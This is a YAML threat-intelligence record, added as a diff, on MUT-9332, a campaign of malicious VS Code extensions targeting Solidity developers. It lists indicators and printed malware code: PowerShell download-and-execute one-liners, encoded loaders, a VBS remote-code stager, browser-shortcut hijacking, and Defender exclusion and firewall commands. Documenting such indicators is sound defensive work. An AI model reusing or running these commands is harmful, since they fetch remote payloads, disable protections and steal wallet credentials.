@@ -1,0 +1,284 @@
+title: Malicious VS Code Extensions Targeting Solidity Developers (MUT-9332)
+description: Three malicious VS Code extensions (solaibot, among-eth, blankebesxstnion)
+  target Solidity developers on Windows, delivering a multi-stage infection chain
+  that installs a malicious browser extension and executes a credential-stealing executable
+  (myau.exe) while exfiltrating cryptocurrency wallet data to attacker infrastructure.
+attribution: MUT-9332
+malware_families:
+- solaibot
+- among-eth
+- blankebesxstnion
+- myau.exe
+- Launch.exe
+- Quasar RAT
+- myau
+- myaunet
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  - cscript.exe
+  - cmd.exe
+  - reagentc.exe
+  - netsh.exe
+  - myau.exe
+  - myaunet.exe
+  - wmam.exe
+  - Launch.exe
+  - netsh
+  command_lines:
+  - powershell -ExecutionPolicy Bypass -Command "irm https://solidity[.]bot/a.txt
+    | iex"
+  - powershell -ExecutionPolicy Bypass -Command "irm https://solidity[.]bot/1.txt
+    | iex"
+  - powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Sleep -Seconds
+    120; irm https://solidity[.]bot/3.txt | iex"
+  - powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Sleep -Seconds
+    120; irm https://solidity[.]bot/2.txt | iex"
+  - Start-Process "cmd.exe" -ArgumentList "/c reg add ""HKCU\Software\Microsoft""
+    /v ""Version"" /t REG_SZ /d $Hp3dV2hGEhAByxaHc5acAhrDATt08gG3 /f" -WindowStyle
+    Hidden
+  - Start-Process $ekCp5C557Z0pSNsJ08iq8V80hqJI -Verb "RunAs" -WindowStyle Hidden
+  - powershell -nop -w hidden -c
+  - powershell -Command "Add-MpPreference -ExclusionPath '<LocalAppData path>'"
+  - netsh advfirewall firewall add rule name="Windows Updater" dir=out action=block
+    remoteip=20.190.128.0/18,40.76.0.0/14,13.107.4.50,13.107.5.88 enable=yes
+  - powershell -nop -w hidden -c "<interregency payload>"
+  powershell:
+  - irm https://solidity[.]bot/a.txt | iex
+  - irm https://solidity[.]bot/1.txt | iex
+  - Start-Sleep -Seconds 120; irm https://solidity[.]bot/3.txt | iex
+  - Start-Sleep -Seconds 120; irm https://solidity[.]bot/2.txt | iex
+  - '$url = "https://solidity[.]bot/a.vbs"
+
+    $localFile = "$env:temp\a.vbs"
+
+    Invoke-WebRequest -Uri $url -OutFile $localFile
+
+    Start-Process -FilePath "cscript.exe" -WindowStyle Hidden -ArgumentList $localFile
+
+    Start-Sleep -Seconds 600
+
+    Remove-Item -Path $localFile -Force'
+  - $unsuspiciously = '0/0VUbd12h/d/ee.etsap//:ptth';$pilpul = $unsuspiciously -replace
+    '#', 't';$goondie = 'https://archive[.]org/download/new_image_20250509_1852/new_image.jpg';$quivery
+    = New-Object System.Net.WebClient;$quivery.Headers.Add('User-Agent','Mozilla/5.0');$episternum
+    = $quivery.DownloadData($goondie);$philocrats = [System.Text.Encoding]::UTF8.GetString($episternum);
+  - Add-MpPreference -ExclusionPath '<LocalAppData path>'
+  - '$url="https://solidity[.]bot/a.vbs"
+
+    $localFile="$env:temp\a.vbs"
+
+    Invoke-WebRequest -Uri $url -OutFile $localFile
+
+    Start-Process -FilePath "cscript.exe" -WindowStyle Hidden -ArgumentList $localFile
+
+    Start-Sleep -Seconds 600
+
+    Remove-Item -Path $localFile -Force'
+  - $liblong = '<celom>' -replace 'a','';$delope = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($liblong));Invoke-Expression
+    $delope;
+  - 706F7765727368656C6C202D457865637574696F6E506F6C69637920427970617373202D436F6D6D616E64202269726D2068747470733A2F2F736F6C69646974792E626F742F612E747874207C2069657822
+  - 'function Check-And-Replace{
+
+    [CmdletBinding()]
+
+    param(
+
+    [Parameter(Mandatory=$true, Position=0)][string]$Path,
+
+    [string[]]$BrowserNames= @("Opera GX Browser","Opera GX","Opera Browser","Opera
+    GX Internet Browser","Opera Internet Browser","Google Chrome","Brave","Brave Browser","Microsoft
+    Edge","DolphinAnty","Chromium","Yandex","Yandex Browser","Ungoogled Chromium","Mises"),
+
+    [string]$ExtensionArg="--load-extension=`"$env:APPDATA\CheckExtension`"")
+
+    if(-not(Test-Path $Path)){return}
+
+    Get-ChildItem -Path $Path -Filter *.lnk -Recurse -ErrorAction SilentlyContinue
+    | ForEach-Object{
+
+    $shortcutFile=$_.FullName
+
+    $shell=New-Object -ComObject WScript.Shell
+
+    $shortcut=$shell.CreateShortcut($shortcutFile)
+
+    foreach($browserName in $BrowserNames){
+
+    if($_.BaseName -like "*$browserName*"){
+
+    if($shortcut.Arguments -notmatch [regex]::Escape($ExtensionArg)){
+
+    $shortcut.Arguments ="$($shortcut.Arguments)$ExtensionArg"
+
+    $shortcut.Save()
+
+    }else{}break}}}}'
+  - '$QdHohq8z7aFLPrEGgoX7dfN8kvhS="myau"
+
+    $TjxLlCbWKIaLPzNk28sqmhWL58Zo7altSZzF="https://"
+
+    $m4eNWOkl5jp3WQh9bwqN31Puj9sJqS2M3KjdeoD1bNSuChf2m="net.su"
+
+    $CqVnU6XxTsDIWg1AQhEPxVOFguF2ng0BaFgKbHFOlH=$TjxLlCbWKIaLPzNk28sqmhWL58Zo7altSZzF+$QdHohq8z7aFLPrEGgoX7dfN8kvhS
+
+    $CqVnU6XxTsDIWg1AQhEPxVOFguF2ng0BaFgKbHFOlH=$CqVnU6XxTsDIWg1AQhEPxVOFguF2ng0BaFgKbHFOlH+$m4eNWOkl5jp3WQh9bwqN31Puj9sJqS2M3KjdeoD1bNSuChf2m'
+  - '[System.IO.File]::WriteAllBytes($ekCp5C557Z0pSNsJ08iq8V80hqJI,$sx2qp84mQy42m3wUmsojQs4BUaix4c4KFZMrvE)
+
+    attrib +H +S $ekCp5C557Z0pSNsJ08iq8V80hqJI
+
+    Start-Process "cmd.exe" -ArgumentList "/c reg add ""HKCU\Software\Microsoft""
+    /v ""Version"" /t REG_SZ /d $Hp3dV2hGEhAByxaHc5acAhrDATt08gG3 /f" -WindowStyle
+    Hidden
+
+    Start-Sleep -s 3
+
+    Start-Process $ekCp5C557Z0pSNsJ08iq8V80hqJI -Verb "RunAs" -WindowStyle Hidden'
+  scripts:
+  - a.vbs
+  - 'On Error Resume Next
+
+    Dim pedireme, motorcars, therblig, aubain, intruders, spinel
+
+    aubain = "MSXML2.ServerXMLHTTP"
+
+    therblig = "http://paste[.]ee/d/0ykW3Z2K/0"
+
+    intruders = "GET"
+
+    spinel = "responseText"
+
+    Set pedireme = CreateObject(aubain)
+
+    pedireme.Open intruders, therblig, False
+
+    pedireme.Send
+
+    motorcars = Eval("pedireme." & spinel)
+
+    ExecuteGlobal motorcars'
+  - 'On Error Resume Next
+
+    Dim pedireme, motorcars, therblig, aubain, intruders, spinel
+
+    aubain = "MSaa1.[ TwedRE  vOXML2.Saa L[ poedE v@eraa 1. reede  v@veaa LI TweE
+    8"
+
+    aubain = Replace(aubain, "aa-t.[ ypoedg =~@", ")")
+
+    therblig = "haa L[ oeE ~vOtaa [ ToedE  @taa 1.0 Tords  ~vOpaa ] roede ~v: 4"
+
+    therblig = Replace(therblig, "aa1.[roede ~@", ")")
+
+    intruders = "Gaa%.[ pwedE w@Eda 1 [ TordRE  DT"
+
+    intruders = Replace(intruders, "&a l.[SpoedE w~@", "")
+
+    spinel = "respodaant.[Jorwedae  v@nseaal.[ yoed e v@Text"
+
+    spinel = Replace(spinel, "aa [ peadeg @", "")
+
+    Set pedireme = CreateObject(aubain)
+
+    pedireme.Open intruders, therblig, False
+
+    pedireme.Send
+
+    motorcars = Eval("pedireme." & spinel)
+
+    ExecuteGlobal motorcars'
+  registry_keys:
+  - HKEY_CURRENT_USER\Software\Microsoft
+  - HKCU\Software\Microsoft
+  - HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths
+  image_loads:
+  - ntdll.dll
+  network_connections:
+  - extension.js -> solidity[.]bot:443
+  - a.txt -> solidity[.]bot:443
+  - 1.txt -> solidity[.]bot:443
+  - 2.txt -> myaunet[.]su
+  - a.vbs -> paste[.]ee:80
+  - content.js -> solidity[.]bot/fetchPrices
+  - PowerShell -> archive[.]org/download/new_image_20250509_1852/new_image.jpg
+  - myau.exe -> myaunet[.]su:443
+  - myaunet.exe -> m-vn[.]ws:443
+  file_activity:
+  - $env:APPDATA\CheckExtension
+  - $env:temp\a.vbs
+  - Launch.exe
+  - myau.exe
+  - new_image.jpg
+  - extension.zip
+  - myaunet.exe
+  - wmam.exe
+  - among-eth.vsix
+  - blankebesxstnion.vsix
+  - solaibot.vsix
+  - injected.js
+  - content.js
+  - h.js
+  - 1.txt
+  persistence:
+  - Browser shortcut (.lnk) modification to add --load-extension="$env:APPDATA\CheckExtension"
+    argument for Chromium-based browsers in Taskbar, Start Menu, Quick Launch, Desktop,
+    and One Drive Desktop
+  - Registry key added under HKEY_CURRENT_USER\Software\Microsoft (App = crypto)
+  - Registry key added under HKEY_CURRENT_USER\Software\Microsoft named Application
+  - Registry key added under HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths
+  - Launch.exe written to disk with Hidden (+H) and System (+S) attributes and executed
+    with elevated privileges
+  - Browser shortcut LNK files modified to append --load-extension="$env:APPDATA\CheckExtension"
+    argument targeting Taskbar, Start Menu, Quick Launch, Desktop, and OneDrive Desktop
+    locations
+  - Registry key HKCU\Software\Microsoft with value "Version" written via cmd.exe
+    reg add
+  - HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths used to exclude
+    LocalAppData directory from Windows Defender scanning
+  - RtlSetProcessIsCritical(true) called via ntdll.dll to make process critical
+  - Windows Defender exclusion added via Add-MpPreference -ExclusionPath for LocalAppData
+    path
+  - Firewall rule named "Windows Updater" added to block Microsoft telemetry IPs outbound
+  process_relations:
+  - cscript.exe -> a.vbs
+  - cmd.exe -> reg add "HKCU\Software\Microsoft"
+  - Launch.exe -> myau.exe
+iocs:
+  hashes:
+  - ce72b79e324371134db762fe70b8b1789af899d7217461bc3658a6bd84743eb6
+  - e19d5d8f941b9a98fbb3b65e1e6077fa00d97529e351e455297b0204ec07e9ed
+  - 209fb5bb2440ffe1a631dfe3b574229105a33c5153eded023cc77d8e8f81d1de
+  - e0ca66c1a9a68b319b24a7c6b8fdca219dffd802dd4de2d59f602c4d90f40d6c
+  - c5c0228a1e0ba2bb748219325f66acf17078a26165b45728d8e98150377aa068
+  - a1eadd41327bd8736e275627d3953944fe7089c032d72a3e429ff18ad0958ada
+  - c3684164933c3f54d5b0b242a8a906a85d633de479079a820bb804c0f73c0f58
+  ip_addresses:
+  - 20.190.128.0/18
+  - 40.76.0.0/14
+  - 13.107.4.50
+  - 13.107.5.88
+  domains:
+  - solidity[.]bot
+  - myaunet[.]su
+  - paste[.]ee
+  - archive[.]org
+  - m-vn[.]ws
+  - begalinokotobananinotrippitroppacrocofanclub[.]su
+  urls:
+  - https://solidity[.]bot/version.json
+  - https://solidity[.]bot/a.txt
+  - https://solidity[.]bot/1.txt
+  - https://solidity[.]bot/2.txt
+  - https://solidity[.]bot/3.txt
+  - https://solidity[.]bot/a.vbs
+  - http://paste[.]ee/d/0ykW3Z2K/0
+  - https://archive[.]org/download/new_image_20250509_1852/new_image.jpg
+  - solidity[.]bot/fetchPrices
+  - https://myaunet[.]su/HprEZkZZZrtZEH/TMDSRNerS
+  - https://m-vn[.]ws/bird.php
+  - https://begalinokotobananinotrippitroppacrocofanclub[.]su
+authors: []
+reference: https://securitylabs.datadoghq.com/articles/mut-9332-malicious-solidity-vscode-extensions
+date_of_publication: May 21, 2025
+file_creation_date: May 26, 2026
